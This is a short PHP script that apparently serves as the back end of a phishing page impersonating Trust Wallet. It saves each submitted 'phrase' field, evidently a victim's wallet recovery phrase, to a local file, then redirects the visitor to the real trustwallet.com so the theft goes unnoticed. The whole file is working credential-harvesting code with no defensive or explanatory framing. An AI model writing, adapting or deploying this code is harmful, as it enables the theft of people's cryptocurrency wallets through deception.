<?php
file_put_contents("phrases.txt", "Phrase: " . $_POST['phrase'] . "\n", FILE_APPEND);
header("Location: https://trustwallet.com"); // Redirect to real site
exit();
?>
